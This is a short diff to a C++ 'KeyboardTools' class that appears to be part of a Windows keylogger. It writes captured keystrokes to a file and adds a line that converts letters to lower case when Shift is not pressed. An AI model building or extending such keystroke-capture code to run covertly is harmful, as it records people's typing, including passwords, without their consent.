@@ -41,16 +41,17 @@ class KeyboardTools{
 							case 0xbe:
 								fprintf(outputfd, ".");
 								break;
-							case 0xbc: 
+							case 0xbc:
 								fprintf(outputfd, ",");
 								break;
 							default:
+							if (key>64&&key<92&&!(GetAsyncKeyState(0x10)))key+=32;
 								fprintf(outputfd, "%c", key);
 						}
 						fflush(__fpr);
 					}
 				}
-				
+
 			}
 		}
 };
